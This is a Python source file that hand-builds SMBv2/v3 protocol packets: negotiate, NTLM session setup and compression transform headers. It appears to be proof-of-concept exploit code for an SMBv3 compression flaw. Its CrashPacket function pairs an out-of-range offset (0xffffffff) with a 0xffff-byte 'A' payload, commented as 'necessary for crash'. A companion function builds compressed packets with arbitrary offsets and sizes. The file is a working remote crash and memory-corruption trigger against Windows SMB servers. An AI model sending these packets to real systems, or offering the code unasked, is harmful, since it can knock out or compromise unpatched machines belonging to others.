import struct, uuid

########################################
#   SMB structs
########################################

class SMBHeader:
    # microsoft docs specify this format, on the wire traffic differs
    # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cifs/69a29f73-de0c-45a6-a1aa-8ceeea42217f
    def __init__(self, protocol_id, header_length, credit_charge, channel_sequence, reserved, command,
    credits_requested, flags, offset, message_id, process_id, tree_id, session_id, signature):
        self.protocol_id = protocol_id
        self.header_length = header_length
        self.credit_charge = credit_charge
        self.channel_sequence = channel_sequence
        self.reserved = reserved
        self.command = command
        self.credits_requested = credits_requested
        self.flags = flags
        self.offset = offset
        self.message_id = message_id
        self.process_id = process_id
        self.tree_id = tree_id
        self.session_id = session_id
        self.signature = signature

    def raw(self):
        return  self.protocol_id + self.header_length + self.credit_charge + self.channel_sequence + \
                self.reserved + self.command + self.credits_requested + self.flags + self.offset + \
                self.message_id + self.process_id + self.tree_id + self.session_id + self.signature
    

class SMBNegotiateContext:
    SMB2_PREAUTH_INTEGRITY_CAPABILITIES = b"\x01\x00"
    SMB2_ENCRYPTION_CAPABILITIES = b"\x02\x00"
    SMB2_COMPRESSION_CAPABILITIES = b"\x03\x00"
    SMB2_NETNAME_NEGOTIATE_CONTEXT_ID =  b"\x05\x00"
    SMB2_TRANSPORT_CAPABILITIES = b"\x06\x00"
    SMB2_RDMA_TRANSFORM_CAPABILITIES = b"\x07\x00"
        
    def __init__(self, context_type, reserved, data):
        self.context_type = context_type
        self.reserved = reserved
        self.data = data
        self.data_length = struct.pack("<H",len(data))

    def raw(self):
        return self.context_type + self.data_length + self.reserved + self.data


class SMBNegotiateRequest:
    def __init__(self, dialect_count, security_mode, reserved, capabilities, client_guid,
    negotiate_context, dialects, padding, negotiate_context_list):
        self.structure_size = b"\x24\x00"
        self.dialect_count = dialect_count
        self.security_mode = security_mode
        self.reserved = reserved
        self.capabilities = capabilities
        self.client_guid = client_guid
        self.negotiate_context = negotiate_context
        self.dialects = dialects
        self.padding = padding
        self.negotiate_context_list = negotiate_context_list

    def raw(self):
        return  self.structure_size + self.dialect_count + self.security_mode + self.reserved + \
                self.capabilities + self.client_guid + self.    negotiate_context + self.dialects + \
                self.padding + self.negotiate_context_list


class SMBPacket:
    def __init__(self, data):
        self.size = struct.pack(">I",len(data))
        self.data = data
        self.bytes =  self.size + self.data

    def raw(self):
        return self.size + self.data


class SMBSessionSetup:
    SECURITY_BLOB = b"\x4e\x54\x4c\x4d\x53\x53\x50\x00\x01\x00\x00\x00\x31\x90\x88\xe2" \
    b"\x00\x00\x00\x00\x28\x00\x00\x00\x00\x00\x00\x00\x28\x00\x00\x00" \
    b"\x06\x01\xb1\x1d\x00\x00\x00\x0f"

    def __init__(self, flags, security_mode, capabilities, channel,  blob_offset,
    blob_length, previous_session_id, security_blob):
        self.structure_size = b"\x19\x00"
        self.flags = flags
        self.security_mode = security_mode
        self.capabilities = capabilities
        self.channel = channel
        self.previous_session_id = previous_session_id
        self.blob_offset = blob_offset
        self.blob_length = blob_length
        self.security_blob = security_blob

    def raw(self):
        return  self.structure_size + self.flags + self.security_mode + self.capabilities + \
                self.channel + self.blob_offset + self.blob_length + self.previous_session_id + \
                self.security_blob


class SMBCompressionTransformHeader:
    def __init__(self, protocol_id, original_size, compression_algorithm, reserve, offset):
        self.protocol_id = protocol_id
        self.original_size = original_size
        self.compression_algorithm = compression_algorithm
        self.reserve = reserve
        self.offset = offset

    def raw(self):
        return  self.protocol_id + self.original_size + self.compression_algorithm + \
                self.reserve + self.offset


########################################
#   Packet contructors
########################################

def CrashPacket():
    # data is necessary for crash
    data = b'A' * 0xffff
    h = SMBCompressionTransformHeader(
        b"\xfc\x53\x4d\x42", # protocol_id
        struct.pack("<I",len(data)), # original_size
        b"\x01\x00", # compression_algorithm
        b"\xff\xff", # reserve
        b"\xff\xff\xff\xff", # offset
    )
    
    return SMBPacket(h.raw() + data).raw()


def CompressedPacket(original_size, offset, raw_data, compressed_data):
    h = SMBCompressionTransformHeader(
        b"\xfc\x53\x4d\x42", # protocol_id
        struct.pack("<I", original_size), # original_size, struct.pack("<I",len(data))
        b"\x01\x00", # compression_algorithm
        b"\xff\xff", # reserve
        struct.pack("<I", offset) # offset
    )

    return SMBPacket(h.raw() + raw_data + compressed_data).raw()


def NegotiateProtocolRequestPacket():
    h = SMBHeader(
        b'\xfe\x53\x4d\x42',
        b'\x40\x00',
        b'\x00\x00',
        b'\x00\x00',
        b'\x00\x00',
        b'\x00\x00',
        b'\x00\x00',
        b'\x00\x00\x00\x00',
        b'\x00\x00\x00\x00',
        b'\x00\x00\x00\x00\x00\x00\x00\x00',
        b'\x00\x00\x00\x00',
        b'\x00\x00\x00\x00',
        b'\x00\x00\x00\x00\x00\x00\x00\x00',
        b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    )
    
    ic = SMBNegotiateContext(
        SMBNegotiateContext.SMB2_PREAUTH_INTEGRITY_CAPABILITIES,
        b"\x00\x00\x00\x00",
        b"\x01\x00" + b"\x20\x00" + b"\x01\x00" + (b"\x00" * 32)
    )
    ec = SMBNegotiateContext(
        SMBNegotiateContext.SMB2_ENCRYPTION_CAPABILITIES,
        b"\x00\x00\x00\x00",
        b"\x02\x00" + b"\x02\x00" + b"\x01\x00"
    )
    cc = SMBNegotiateContext(
        SMBNegotiateContext.SMB2_COMPRESSION_CAPABILITIES,
        b"\x00\x00\x00\x00",
        b"\x04\x00" + b"\x00\x00\x01\x00\x00\x01" + b"\x00\x00" + b"\x01\x00" + b"\x02\x00" + b"\x03\x00"
    )
    nr = SMBNegotiateRequest(
        b"\x05\x00",
        b"\x02\x00",
        b"\x00\x00",
        b"\x44\x00\x00\x00",
        uuid.uuid4().bytes,
        b"\x70\x00\x00\x00" + b"\x03\x00" + b"\x00\x00",
        b"\x02\x02" + b"\x10\x02" + b"\x00\x03" + b"\x02\x03" + b"\x11\x03" + b"\x00\x00",
        b"",
        ic.raw()+ b"\x00\x00" + ec.raw() + b"\x00\x00" + cc.raw(),
    )    
    return SMBPacket(h.raw() + nr.raw()).raw()    


def SessionSetupRequestPacket():
    h = SMBHeader(
        b'\xfe\x53\x4d\x42',
        b'\x40\x00',
        b'\x01\x00',
        b'\x00\x00',
        b'\x00\x00',
        b'\x01\x00',
        b'\x00\x01',
        b'\x00\x00\x00\x00',
        b'\x00\x00\x00\x00',
        b'\x01\x00\x00\x00\x00\x00\x00\x00',
        b'\x00\x00\x00\x00',
        b'\x00\x00\x00\x00',
        b'\x00\x00\x00\x00\x00\x00\x00\x00',
        b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    )
    ss = SMBSessionSetup(
        b"\x00",
        b"\x02",
        b"\x00\x00\x00\x00",
        b"\x00\x00\x00\x00",
        b"\x58\x00",
        b"\x28\x00",
        b"\x00\x00\x00\x00\x00\x00\x00\x00",
        SMBSessionSetup.SECURITY_BLOB
    )
    
    return SMBPacket(h.raw() + ss.raw()).raw()